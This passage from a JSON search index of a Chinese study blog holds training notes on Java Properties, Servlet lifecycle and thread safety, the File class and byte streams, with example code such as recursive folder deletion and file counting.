value)：设置集合的键和值，都是String类型 prop.setProperty(\"itheima001\", \"佟丽娅\"); prop.setProperty(\"itheima002\", \"赵丽颖\"); prop.setProperty(\"itheima003\", \"刘诗诗\"); //String getProperty(String key)：使用此属性列表中指定的键搜索属性 // System.out.println(prop.getProperty(\"itheima001\")); // System.out.println(prop.getProperty(\"itheima0011\")); // System.out.println(prop); //Set\u003cString\u003e stringPropertyNames()：从该属性列表中返回一个不可修改的键集，其中键及其对应的值是字符串 Set\u003cString\u003e names = prop.stringPropertyNames(); for (String key : names) { // System.out.println(key); String value = prop.getProperty(key); System.out.println(key + \",\" + value); } } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:4:2","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"4.3Properties和IO流相结合的方法【应用】 和IO流结合的方法 方法名 说明 void load(Reader reader) 从输入字符流读取属性列表（键和元素对） void store(Writer writer, String comments) 将此属性列表（键和元素对）写入此 Properties表中，以适合使用 load(Reader)方法的格式写入输出字符流 示例代码 public class PropertiesDemo03 { public static void main(String[] args) throws IOException { //把集合中的数据保存到文件 // myStore(); //把文件中的数据加载到集合 myLoad(); } private static void myLoad() throws IOException { Properties prop = new Properties(); //void load(Reader reader)： FileReader fr = new FileReader(\"myOtherStream\\\\fw.txt\"); prop.load(fr); fr.close(); System.out.println(prop); } private static void myStore() throws IOException { Properties prop = new Properties(); prop.setProperty(\"itheima001\",\"佟丽娅\"); prop.setProperty(\"itheima002\",\"赵丽颖\"); prop.setProperty(\"itheima003\",\"刘诗诗\"); //void store(Writer writer, String comments)： FileWriter fw = new FileWriter(\"myOtherStream\\\\fw.txt\"); prop.store(fw,null); fw.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:4:3","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"4.4Properties集合练习【应用】 案例需求 在Properties文件中手动写上姓名和年龄,读取到集合中,将该数据封装成学生对象,写到本地文件 实现步骤 创建Properties集合,将本地文件中的数据加载到集合中 获取集合中的键值对数据,封装到学生对象中 创建序列化流对象,将学生对象序列化到本地文件中 代码实现 学生类 public class Student implements Serializable { private static final long serialVersionUID = 1L; private String name; private int age; public Student() { } public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } @Override public String toString() { return \"Student{\" + \"name='\" + name + '\\'' + \", age=\" + age + '}'; } } 测试类 public class Test { public static void main(String[] args) throws IOException { //1.创建Properties集合,将本地文件中的数据加载到集合中 Properties prop = new Properties(); FileReader fr = new FileReader(\"prop.properties\"); prop.load(fr); fr.close(); //2.获取集合中的键值对数据,封装到学生对象中 String name = prop.getProperty(\"name\"); int age = Integer.parseInt(prop.getProperty(\"age\")); Student s = new Student(name,age); //3.创建序列化流对象,将学生对象序列化到本地文件中 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"a.txt\")); oos.writeObject(s); oos.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%BA%8C/:4:4","tags":[],"title":"File \u0026 IO 二","uri":"/posts/file-io-%E4%BA%8C/"},{"categories":["大三下实训笔记"],"content":"Servlet使用","date":"2021-07-19","objectID":"/posts/servlet/","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"Servlet 0.学习目标 理解servlet的执行过程 掌握servlet的3种实现方式 理解servlet的生命周期方法 理解servletContext域的使用/学生管理系统的保存的功能 1 Servlet ","date":"2021-07-19","objectID":"/posts/servlet/:0:0","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1.1 Servlet概述 Servlet是SUN公司提供的一套规范，名称就叫Servlet规范，它也是JavaEE规范之一。我们可以像学习Java基础一样，通过API来学习Servlet。这里需要注意的是，在我们之前JDK的API中是没有Servlet规范的相关内容，需要使用JavaEE的API。目前在Oracle官网中的最新版本是JavaEE8，该网址中介绍了JavaEE8的一些新特性。当然，我们可以通过访问官方API，学习和查阅里面的内容。 打开官方API网址，在左上部分找到javax.servlet包，在左下部分找到Servlet，如下图显示： 通过阅读API，我们得到如下信息： 第一：Servlet是一个运行在web服务端的java小程序 第二：它可以用于接收和响应客户端的请求 第三：要想实现Servlet功能，可以实现Servlet接口，继承GenericServlet或者HttpServlet 第四：每次请求都会执行service方法 第五：Servlet还支持配置 具体请看下图： ","date":"2021-07-19","objectID":"/posts/servlet/:1:0","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1.2 Servlet入门 ","date":"2021-07-19","objectID":"/posts/servlet/:2:0","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1.2.1 Servlet编码步骤 1）编码步骤 第一步：前期准备-创建JavaWeb工程 第二步：编写一个普通类继承GenericServlet并重写service方法 第三步：在web.xml配置Servlet 2）测试 在Tomcat中部署项目 在浏览器访问Servlet ","date":"2021-07-19","objectID":"/posts/servlet/:2:1","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1.2.2 Servlet执行过程分析 我们通过浏览器发送请求，请求首先到达Tomcat服务器，由服务器解析请求URL，然后在部署的应用列表中找到我们的应用。接下来，在我们的应用中找应用里的web.xml配置文件，在web.xml中找到FirstServlet的配置，找到后执行service方法，最后由FirstServlet响应客户浏览器。整个过程如下图所示： 一句话总结执行过程： 浏览器——\u003eTomcat服务器——\u003e我们的应用——\u003e应用中的web.xml——\u003eFirstServlet——\u003e响应浏览器 ","date":"2021-07-19","objectID":"/posts/servlet/:2:2","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1.2.3 Servlet类视图 在《Tomcat和Http协议》这天课程和刚才的入门案例中，我们都定义了自己的Servlet，实现的方式都是选择继承GenericServlet，在Servlet的API介绍中，它提出了我们除了继承GenericServlet外还可以继承HttpServlet，通过查阅servlet的类视图，我们看到GenericServlet还有一个子类HttpServlet。同时，在service方法中还有参数ServletRequest和ServletResponse，它们的关系如下图所示： ","date":"2021-07-19","objectID":"/posts/servlet/:2:3","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1.2.4 Servlet编写方式 1）编写方式说明 我们在实现Servlet功能时，可以选择以下三种方式： 第一种：实现Servlet接口，接口中的方法必须全部实现。 ​ 使用此种方式，表示接口中的所有方法在需求方面都有重写的必要。此种方式支持最大程度的自定义。 第二种：继承GenericServlet，service方法必须重写，其他方可根据需求，选择性重写。 ​ 使用此种方式，表示只在接收和响应客户端请求这方面有重写的需求，而其他方法可根据实际需求选择性重写，使我们的开发Servlet变得简单。但是，此种方式是和HTTP协议无关的。 第三种：继承HttpServlet，它是javax.servlet.http包下的一个抽象类，是GenericServlet的子类。如果我们选择继承HttpServlet时，只需要重写doGet和doPost方法，不要覆盖service方法。 ​ 使用此种方式，表示我们的请求和响应需要和HTTP协议相关。也就是说，我们是通过HTTP协议来访问的。那么每次请求和响应都符合HTTP协议的规范。请求的方式就是HTTP协议所支持的方式（目前我们只知道GET和POST，而实际HTTP协议支持7种请求方式，GET POST PUT DELETE TRACE OPTIONS HEAD )。 2）HttpServlet的使用细节 第一步：在入门案例的工程中创建一个Servlet继承HttpServlet 注意：不要重写任何方法，如下图所示： 第二步：部署项目并测试访问 当我们在地址栏输入ServletDemo2的访问URL时，出现了访问错误，状态码是405。提示信息是：方法不允许。 第三步：分析原因 得出HttpServlet的使用结论： ​ 我们继承了HttpServlet，需要重写里面的doGet和doPost方法来接收get方式和post方式的请求。 为了实现代码的可重用性，我们只需要在doGet或者doPost方法中一个里面提供具体功能即可，而另外的那个方法只需要调用提供了功能的方法。 查看类的所有实现方法：commond+7 查看类的继承体系：control+H 【小结： servlet 实现的三种方式 * servlet 实现的三种方式： * 1. 实现servlet接口 * 2. 继承 GenericServlet * 3. 继承 HttpServlet (和前面区别： 是一个带有http协议的servlet) ","date":"2021-07-19","objectID":"/posts/servlet/:2:4","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1.3 Servlet使用细节 ","date":"2021-07-19","objectID":"/posts/servlet/:3:0","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1.3.1 Servlet的生命周期(掌握) 对象的生命周期，就是对象从生到死的过程，即：出生——活着——死亡。用更偏向 于开发的官方说法就是对象创建到销毁的过程。 出生：请求第一次到达Servlet时，对象就创建出来，并且初始化成功。只出生一次，就放到内存中。 活着：服务器提供服务的整个过程中，该对象一直存在，每次只是执行service方法。 死亡：当服务停止时，或者服务器宕机时，对象消亡。 通过分析Servlet的生命周期我们发现，它的实例化和初始化只会在请求第一次到达Servlet时执行，而销毁只会在Tomcat服务器停止时执行，由此我们得出一个结论，Servlet对象只会创建一次，销毁一次。所以，Servlet对象只有一个实例。如果一个对象实例在应用中是唯一的存在，那么我们就说它是单实例的，即运用了单例模式。 【小结: servlet的接口定义了5个方法： 其中常用： service : 客户端发起的每次请求当前servlet都会访问到service方法！ （访问N次，执行N次） —\u003e 用于处理业务（处理用户的每次请求） 生命周期方法： init: 初始化 （只执行1次： 对象创建时） –\u003e 我们可以用来加载资源 destroy： 销毁 （只执行1次： 服务器关闭对象销毁时） –\u003e 我们可以释放资源，然后再销毁 ","date":"2021-07-19","objectID":"/posts/servlet/:3:1","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1.3.2 Servlet的线程安全 由于Servlet运用了单例模式，即整个应用中只有一个实例对象，所以我们需要分析这个唯一的实例中的类成员是否线程安全。接下来，我们来看下面的的示例： /** * 演示Servlet的线程安全问题： * 示例需求： * 用两个浏览器模拟两条线程，携带一个username参数。 * @author 黑马程序员 * @Company http://www.itheima.com */ public class Servlet05 extends HttpServlet { private String username; @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { synchronized (this){ username = req.getParameter(\"username\"); try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); } PrintWriter writer = resp.getWriter(); writer.print(\"username is：\"+username); writer.close(); } } @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { doPost(req,resp); } } 通过上面的测试我们发现，在Servlet中定义了类成员之后，多个浏览器都会共享类成员的数据。其实每一个浏览器端发送请求，就代表是一个线程，那么多个浏览器就是多个线程，所以测试的结果说明了多个线程会共享Servlet类成员中的数据，其中任何一个线程修改了数据，都会影响其他线程。因此，我们可以认为Servlet它不是线程安全的。 分析产生这个问题的根本原因，其实就是因为Servlet是单例，单例对象的类成员只会随类实例化时初始化一次，之后的操作都是改变，而不会重新初始化。 解决这个问题也非常简单，就是在Servlet中定义类成员要慎重。如果类成员是共用的，并且只会在初始化时赋值，其余时间都是获取的话，那么是没问题。如果类成员并非共用，或者每次使用都有可能对其赋值，那么就要考虑线程安全问题了，把它定义到doGet或者doPost方法里面去就可以了。 【小结：】 如何避免servlet线程安全问题？ * --servlet其实是单例的！ * 如果是单例对象， 是否存在数据安全问题？(线程安全问题？) * * 如何避免线程安全问题？ * a. 不要在单例对象中，定义成员变量 --- 推荐 * b. 加上锁机制（同步代码代码块） --- 不建议的！ 【补充】： ","date":"2021-07-19","objectID":"/posts/servlet/:3:2","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"1. 关于单例模式： 什么是单例： 在程序运行过程中，不管获取或者访问该对象多少次，最终都是只创建一个对象； ​ 我们今天使用的servlet就是单例模式的！（默认是懒汉） 什么是多例: 每次访问该对象，都是一个全新的对象，都是新初始化的一个！ （以前用的 new User()）; 单例实现的两种方式： ","date":"2021-07-19","objectID":"/posts/servlet/:3:3","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"2.单例线程不安全，那么我们为什么还要使用？— 如何避免线程问题？ 我们的servlet等这些单例对象其实，线程都是存在安全问题的！ –\u003e如何避免！ 我们虽然可以通过上锁来解决，但是我们为了性能，不会上锁！ 所以，需要强调开发规范： ​ 在单例对象中，要谨慎使用成员变量！ 如果是没有必要， 建议不要使用； ​ 只要在成员位置没有变量，那么单例模式数据也是安全的！ 为什么servlet被设计成单例呢？ ​ 为了性能！ ","date":"2021-07-19","objectID":"/posts/servlet/:3:4","tags":[],"title":"Servlet","uri":"/posts/servlet/"},{"categories":["大三下实训笔记"],"content":"File类-字节流InputStream-字节缓冲流lBufferOutputStream","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"1.File类 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:1:0","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"1.1File类概述和构造方法【应用】 File类介绍 它是文件和目录路径名的抽象表示 文件和目录是可以通过File封装成对象的 对于File而言,其封装的并不是一个真正存在的文件,仅仅是一个路径名而已.它可以是存在的,也可以是不存在的.将来是要通过具体的操作把这个路径的内容转换为具体存在的 File类的构造方法 方法名 说明 File(String pathname) 通过将给定的路径名字符串转换为抽象路径名来创建新的 File实例 File(String parent, String child) 从父路径名字符串和子路径名字符串创建新的 File实例 File(File parent, String child) 从父抽象路径名和子路径名字符串创建新的 File实例 示例代码 public class FileDemo01 { public static void main(String[] args) { //File(String pathname): 通过将给定的路径名字符串转换为抽象路径名来创建新的 File实例 File f1 = new File(\"E:\\\\itcast\\\\java.txt\"); System.out.println(f1); //File(String parent, String child): 从父路径名字符串和子路径名字符串创建新的 File实例 File f2 = new File(\"E:\\\\itcast\",\"java.txt\"); System.out.println(f2); //File(File parent, String child): 从父抽象路径名和子路径名字符串创建新的 File实例 File f3 = new File(\"E:\\\\itcast\"); File f4 = new File(f3,\"java.txt\"); System.out.println(f4); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:1:1","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"1.2绝对路径和相对路径【理解】 绝对路径 是一个完整的路径,从盘符开始 相对路径 是一个简化的路径,相对当前项目下的路径 示例代码 public class FileDemo02 { public static void main(String[] args) { // 是一个完整的路径,从盘符开始 File file1 = new File(\"D:\\\\itheima\\\\a.txt\"); // 是一个简化的路径,从当前项目根目录开始 File file2 = new File(\"a.txt\"); File file3 = new File(\"模块名\\\\a.txt\"); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:1:2","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"1.3File类创建功能【应用】 方法分类 方法名 说明 public boolean createNewFile() 当具有该名称的文件不存在时，创建一个由该抽象路径名命名的新空文件 public boolean mkdir() 创建由此抽象路径名命名的目录 public boolean mkdirs() 创建由此抽象路径名命名的目录，包括任何必需但不存在的父目录 示例代码 public class FileDemo02 { public static void main(String[] args) throws IOException { //需求1：我要在E:\\\\itcast目录下创建一个文件java.txt File f1 = new File(\"E:\\\\itcast\\\\java.txt\"); System.out.println(f1.createNewFile()); System.out.println(\"--------\"); //需求2：我要在E:\\\\itcast目录下创建一个目录JavaSE File f2 = new File(\"E:\\\\itcast\\\\JavaSE\"); System.out.println(f2.mkdir()); System.out.println(\"--------\"); //需求3：我要在E:\\\\itcast目录下创建一个多级目录JavaWEB\\\\HTML File f3 = new File(\"E:\\\\itcast\\\\JavaWEB\\\\HTML\"); // System.out.println(f3.mkdir()); System.out.println(f3.mkdirs()); System.out.println(\"--------\"); //需求4：我要在E:\\\\itcast目录下创建一个文件javase.txt File f4 = new File(\"E:\\\\itcast\\\\javase.txt\"); // System.out.println(f4.mkdir()); System.out.println(f4.createNewFile()); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:1:3","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"1.4File类删除功能【应用】 方法分类 方法名 说明 public boolean delete() 删除由此抽象路径名表示的文件或目录 示例代码 public class FileDemo03 { public static void main(String[] args) throws IOException { // File f1 = new File(\"E:\\\\itcast\\\\java.txt\"); //需求1：在当前模块目录下创建java.txt文件 File f1 = new File(\"myFile\\\\java.txt\"); // System.out.println(f1.createNewFile()); //需求2：删除当前模块目录下的java.txt文件 System.out.println(f1.delete()); System.out.println(\"--------\"); //需求3：在当前模块目录下创建itcast目录 File f2 = new File(\"myFile\\\\itcast\"); // System.out.println(f2.mkdir()); //需求4：删除当前模块目录下的itcast目录 System.out.println(f2.delete()); System.out.println(\"--------\"); //需求5：在当前模块下创建一个目录itcast,然后在该目录下创建一个文件java.txt File f3 = new File(\"myFile\\\\itcast\"); // System.out.println(f3.mkdir()); File f4 = new File(\"myFile\\\\itcast\\\\java.txt\"); // System.out.println(f4.createNewFile()); //需求6：删除当前模块下的目录itcast System.out.println(f4.delete()); System.out.println(f3.delete()); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:1:4","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"1.5File类判断和获取功能【应用】 判断功能 方法名 说明 public boolean isDirectory() 测试此抽象路径名表示的File是否为目录 public boolean isFile() 测试此抽象路径名表示的File是否为文件 public boolean exists() 测试此抽象路径名表示的File是否存在 获取功能 方法名 说明 public String getAbsolutePath() 返回此抽象路径名的绝对路径名字符串 public String getPath() 将此抽象路径名转换为路径名字符串 public String getName() 返回由此抽象路径名表示的文件或目录的名称 public File[] listFiles() 返回此抽象路径名表示的目录中的文件和目录的File对象数组 示例代码 public class FileDemo04 { public static void main(String[] args) { //创建一个File对象 File f = new File(\"myFile\\\\java.txt\"); // public boolean isDirectory()：测试此抽象路径名表示的File是否为目录 // public boolean isFile()：测试此抽象路径名表示的File是否为文件 // public boolean exists()：测试此抽象路径名表示的File是否存在 System.out.println(f.isDirectory()); System.out.println(f.isFile()); System.out.println(f.exists()); // public String getAbsolutePath()：返回此抽象路径名的绝对路径名字符串 // public String getPath()：将此抽象路径名转换为路径名字符串 // public String getName()：返回由此抽象路径名表示的文件或目录的名称 System.out.println(f.getAbsolutePath()); System.out.println(f.getPath()); System.out.println(f.getName()); System.out.println(\"--------\"); // public File[] listFiles()：返回此抽象路径名表示的目录中的文件和目录的File对象数组 File f2 = new File(\"E:\\\\itcast\"); File[] fileArray = f2.listFiles(); for(File file : fileArray) { // System.out.println(file); // System.out.println(file.getName()); if(file.isFile()) { System.out.println(file.getName()); } } } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:1:5","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"1.6File类练习一【应用】 案例需求 在当前模块下的aaa文件夹中创建一个a.txt文件 实现步骤 创建File对象,指向aaa文件夹 判断aaa文件夹是否存在,如果不存在则创建 创建File对象,指向aaa文件夹下的a.txt文件 创建这个文件 代码实现 public class Test1 { public static void main(String[] args) throws IOException { //练习一：在当前模块下的aaa文件夹中创建一个a.txt文件 /* File file = new File(\"filemodule\\\\aaa\\\\a.txt\"); file.createNewFile();*/ //注意点:文件所在的文件夹必须要存在. //1.创建File对象,指向aaa文件夹 File file = new File(\"filemodule\\\\aaa\"); //2.判断aaa文件夹是否存在,如果不存在则创建 if(!file.exists()){ //如果文件夹不存在,就创建出来 file.mkdirs(); } //3.创建File对象,指向aaa文件夹下的a.txt文件 File newFile = new File(file,\"a.txt\"); //4.创建这个文件 newFile.createNewFile(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:1:6","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"1.7File类练习二【应用】 案例需求 删除一个多级文件夹 实现步骤 定义一个方法,接收一个File对象 遍历这个File对象,获取它下边的每个文件和文件夹对象 判断当前遍历到的File对象是文件还是文件夹 如果是文件,直接删除 如果是文件夹,递归调用自己,将当前遍历到的File对象当做参数传递 参数传递过来的文件夹File对象已经处理完成,最后直接删除这个空文件夹 代码实现 public class Test2 { public static void main(String[] args) { //练习二：删除一个多级文件夹 //delete方法 //只能删除文件和空文件夹. //如果现在要删除一个有内容的文件夹? //先删掉这个文件夹里面所有的内容. //最后再删除这个文件夹 File src = new File(\"C:\\\\Users\\\\apple\\\\Desktop\\\\src\"); deleteDir(src); } //1.定义一个方法,接收一个File对象 private static void deleteDir(File src) { //先删掉这个文件夹里面所有的内容. //递归 方法在方法体中自己调用自己. //注意: 可以解决所有文件夹和递归相结合的题目 //2.遍历这个File对象,获取它下边的每个文件和文件夹对象 File[] files = src.listFiles(); //3.判断当前遍历到的File对象是文件还是文件夹 for (File file : files) { //4.如果是文件,直接删除 if(file.isFile()){ file.delete(); }else{ //5.如果是文件夹,递归调用自己,将当前遍历到的File对象当做参数传递 deleteDir(file);//参数一定要是src文件夹里面的文件夹File对象 } } //6.参数传递过来的文件夹File对象已经处理完成,最后直接删除这个空文件夹 src.delete(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:1:7","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"1.8File类练习三【应用】 案例需求 统计一个文件夹中每种文件的个数并打印 打印格式如下： txt:3个 doc:4个 jpg:6个 … 实现步骤 定义一个方法,参数是HashMap集合用来统计次数和File对象要统计的文件夹 遍历File对象,获取它下边的每一个文件和文件夹对象 判断当前File对象是文件还是文件夹 如果是文件,判断这种类型文件后缀名在HashMap集合中是否出现过 没出现过,将这种类型文件的后缀名存入集合中,次数存1 出现过,获取这种类型文件的后缀名出现的次数,对其+1,在存回集合中 如果是文件夹,递归调用自己,HashMap集合就是参数集合,File对象是当前文件夹对象 代码实现 public class Test3 { public static void main(String[] args) { //统计一个文件夹中,每种文件出现的次数. //统计 --- 定义一个变量用来统计. ---- 弊端:同时只能统计一种文件 //利用map集合进行数据统计,键 --- 文件后缀名 值 ---- 次数 File file = new File(\"filemodule\"); HashMap\u003cString, Integer\u003e hm = new HashMap\u003c\u003e(); getCount(hm, file); System.out.println(hm); } //1.定义一个方法,参数是HashMap集合用来统计次数和File对象要统计的文件夹 private static void getCount(HashMap\u003cString, Integer\u003e hm, File file) { //2.遍历File对象,获取它下边的每一个文件和文件夹对象 File[] files = file.listFiles(); for (File f : files) { //3.判断当前File对象是文件还是文件夹 if(f.isFile()){ //如果是文件,判断这种类型文件后缀名在HashMap集合中是否出现过 String fileName = f.getName(); String[] fileNameArr = fileName.split(\"\\\\.\"); if(fileNameArr.length == 2){ String fileEndName = fileNameArr[1]; if(hm.containsKey(fileEndName)){ //出现过,获取这种类型文件的后缀名出现的次数,对其+1,在存回集合中 Integer count = hm.get(fileEndName); //这种文件又出现了一次. count++; //把已经出现的次数给覆盖掉. hm.put(fileEndName,count); }else{ // 没出现过,将这种类型文件的后缀名存入集合中,次数存1 hm.put(fileEndName,1); } } }else{ //如果是文件夹,递归调用自己,HashMap集合就是参数集合,File对象是当前文件夹对象代码实现 getCount(hm,f); } } } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:1:8","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.字节流 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:0","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.1 IO流概述和分类【理解】 IO流介绍 IO：输入/输出(Input/Output) 流：是一种抽象概念,是对数据传输的总称.也就是说数据在设备间的传输称为流,流的本质是数据传输 IO流就是用来处理设备间数据传输问题的.常见的应用: 文件复制; 文件上传; 文件下载 IO流的分类 按照数据的流向 输入流：读数据 输出流：写数据 按照数据类型来分 字节流 字节输入流 字节输出流 字符流 字符输入流 字符输出流 IO流的使用场景 如果操作的是纯文本文件,优先使用字符流 如果操作的是图片、视频、音频等二进制文件,优先使用字节流 如果不确定文件类型,优先使用字节流.字节流是万能的流 ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:1","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.2字节流写数据【应用】 字节流抽象基类 InputStream：这个抽象类是表示字节输入流的所有类的超类 OutputStream：这个抽象类是表示字节输出流的所有类的超类 子类名特点：子类名称都是以其父类名作为子类名的后缀 字节输出流 FileOutputStream(String name)：创建文件输出流以指定的名称写入文件 使用字节输出流写数据的步骤 创建字节输出流对象(调用系统功能创建了文件,创建字节输出流对象,让字节输出流对象指向文件) 调用字节输出流对象的写数据方法 释放资源(关闭此文件输出流并释放与此流相关联的任何系统资源) 示例代码 public class FileOutputStreamDemo01 { public static void main(String[] args) throws IOException { //创建字节输出流对象 /* 注意点: 1.如果文件不存在,会帮我们创建 2.如果文件存在,会把文件清空 */ //FileOutputStream(String name)：创建文件输出流以指定的名称写入文件 FileOutputStream fos = new FileOutputStream(\"myByteStream\\\\fos.txt\"); //void write(int b)：将指定的字节写入此文件输出流 fos.write(97); // fos.write(57); // fos.write(55); //最后都要释放资源 //void close()：关闭此文件输出流并释放与此流相关联的任何系统资源。 fos.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:2","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.3字节流写数据的三种方式【应用】 写数据的方法分类 方法名 说明 void write(int b) 将指定的字节写入此文件输出流 一次写一个字节数据 void write(byte[] b) 将 b.length字节从指定的字节数组写入此文件输出流 一次写一个字节数组数据 void write(byte[] b, int off, int len) 将 len字节从指定的字节数组开始，从偏移量off开始写入此文件输出流 一次写一个字节数组的部分数据 示例代码 public class FileOutputStreamDemo02 { public static void main(String[] args) throws IOException { //FileOutputStream(String name)：创建文件输出流以指定的名称写入文件 FileOutputStream fos = new FileOutputStream(\"myByteStream\\\\fos.txt\"); //FileOutputStream(File file)：创建文件输出流以写入由指定的 File对象表示的文件 // FileOutputStream fos = new FileOutputStream(new File(\"myByteStream\\\\fos.txt\")); //void write(int b)：将指定的字节写入此文件输出流 // fos.write(97); // fos.write(98); // fos.write(99); // fos.write(100); // fos.write(101); // void write(byte[] b)：将 b.length字节从指定的字节数组写入此文件输出流 // byte[] bys = {97, 98, 99, 100, 101}; //byte[] getBytes()：返回字符串对应的字节数组 byte[] bys = \"abcde\".getBytes(); // fos.write(bys); //void write(byte[] b, int off, int len)：将 len字节从指定的字节数组开始，从偏移量off开始写入此文件输出流 // fos.write(bys,0,bys.length); fos.write(bys,1,3); //释放资源 fos.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:3","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.4字节流写数据的两个小问题【应用】 字节流写数据如何实现换行 windows:\\r\\n linux:\\n mac:\\r 字节流写数据如何实现追加写入 public FileOutputStream(String name,boolean append) 创建文件输出流以指定的名称写入文件。如果第二个参数为true ，则字节将写入文件的末尾而不是开头 示例代码 public class FileOutputStreamDemo03 { public static void main(String[] args) throws IOException { //创建字节输出流对象 // FileOutputStream fos = new FileOutputStream(\"myByteStream\\\\fos.txt\"); FileOutputStream fos = new FileOutputStream(\"myByteStream\\\\fos.txt\",true); //写数据 for (int i = 0; i \u003c 10; i++) { fos.write(\"hello\".getBytes()); fos.write(\"\\r\\n\".getBytes()); } //释放资源 fos.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:4","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.5字节流写数据加异常处理【应用】 异常处理格式 try-catch-finally try{ 可能出现异常的代码; }catch(异常类名 变量名){ 异常的处理代码; }finally{ 执行所有清除操作; } finally特点 被finally控制的语句一定会执行，除非JVM退出 示例代码 public class FileOutputStreamDemo04 { public static void main(String[] args) { //加入finally来实现释放资源 FileOutputStream fos = null; try { fos = new FileOutputStream(\"myByteStream\\\\fos.txt\"); fos.write(\"hello\".getBytes()); } catch (IOException e) { e.printStackTrace(); } finally { if(fos != null) { try { fos.close(); } catch (IOException e) { e.printStackTrace(); } } } } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:5","tags":[],"title":"File \u0026 IO 一","uri":"/posts/file-io-%E4%B8%80/"},{"categories":["大三下实训笔记"],"content":"2.6字节流读数据(一次读一个字节数据)【应用】 字节输入流 FileInputStream(String name)：通过打开与实际文件的连接来创建一个FileInputStream,该文件由文件系统中的路径名name命名 字节输入流读取数据的步骤 创建字节输入流对象 调用字节输入流对象的读数据方法 释放资源 示例代码 public class FileInputStreamDemo01 { public static void main(String[] args) throws IOException { //创建字节输入流对象 //FileInputStream(String name) FileInputStream fis = new FileInputStream(\"myByteStream\\\\fos.txt\"); int by; /* fis.read()：读数据 by=fis.read()：把读取到的数据赋值给by by != -1：判断读取到的数据是否是-1 */ while ((by=fis.read())!=-1) { System.out.print((char)by); } //释放资源 fis.close(); } } ","date":"2021-07-19","objectID":"/posts/file-io-%E4%B8%80/:2:6","tags":[],"title":"File \u0026 IO 